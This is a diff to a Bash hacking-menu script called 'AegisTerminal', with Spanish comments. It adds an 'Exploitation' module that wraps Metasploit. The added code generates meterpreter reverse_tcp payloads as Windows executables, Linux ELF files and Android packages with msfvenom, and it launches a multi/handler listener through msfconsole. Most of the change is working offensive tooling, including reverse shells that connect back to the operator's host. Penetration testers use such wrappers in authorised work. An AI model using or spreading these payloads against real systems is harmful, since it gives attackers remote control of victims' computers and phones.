@@ -25,7 +25,7 @@ show_banner() {
     echo "               __/ |                                                "
     echo "              |___/                                                 "
     echo -e "${NC}"
-    echo -e "${PURPLE}      [ AegisTerminal v1.3 - The Shield of Security ]${NC}"
+    echo -e "${PURPLE}      [ AegisTerminal v1.4 - The Shield of Security ]${NC}"
     echo " --------------------------------------------------------------"
 }
 
@@ -56,7 +56,50 @@ main_menu() {
     esac
 }
 
-# Módulo Network Recon (Nuevo)
+# Módulo Exploitation (Nuevo)
+exploit_menu() {
+    show_banner
+    echo -e "${BLUE}--- Exploitation Framework (Metasploit) ---${NC}"
+    echo -e "1) Generate Payload (msfvenom)"
+    echo -e "2) Start Multi-Handler (Listener)"
+    echo -e "0) Back"
+    echo ""
+    read -p "Aegis/Exploit > " exp_choice
+    case $exp_choice in
+        1)
+            echo -e "Select Platform: 1) Windows 2) Linux 3) Android"
+            read -p "> " plat_choice
+            read -p "Enter LHOST (Your IP): " lhost
+            read -p "Enter LPORT: " lport
+            read -p "Enter Output Filename: " output
+            
+            case $plat_choice in
+                1) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f exe -o "$output" ;;
+                2) msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf -o "$output" ;;
+                3) msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output" ;;
+            esac
+            read -p "Payload generated. Press enter..."
+            exploit_menu
+            ;;
+        2)
+            read -p "Enter LHOST (Your IP): " lhost
+            read -p "Enter LPORT: " lport
+            echo -e "Select Payload: 1) Windows 2) Linux 3) Android"
+            read -p "> " pay_choice
+            case $pay_choice in
+                1) payload="windows/x64/meterpreter/reverse_tcp" ;;
+                2) payload="linux/x64/meterpreter/reverse_tcp" ;;
+                3) payload="android/meterpreter/reverse_tcp" ;;
+            esac
+            msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit"
+            exploit_menu
+            ;;
+        0) main_menu ;;
+        *) exploit_menu ;;
+    esac
+}
+
+# Módulo Network Recon
 network_menu() {
     show_banner
     echo -e "${BLUE}--- Network Reconnaissance (Nmap) ---${NC}"
@@ -165,7 +208,6 @@ system_menu() {
 }
 
 wifi_menu() { show_banner; echo "WiFi Module - Under Construction"; sleep 1; main_menu; }
-exploit_menu() { show_banner; echo "Exploit Module - Under Construction"; sleep 1; main_menu; }
 update_tool() { echo "Checking for updates..."; sleep 1; main_menu; }
 
 # Start
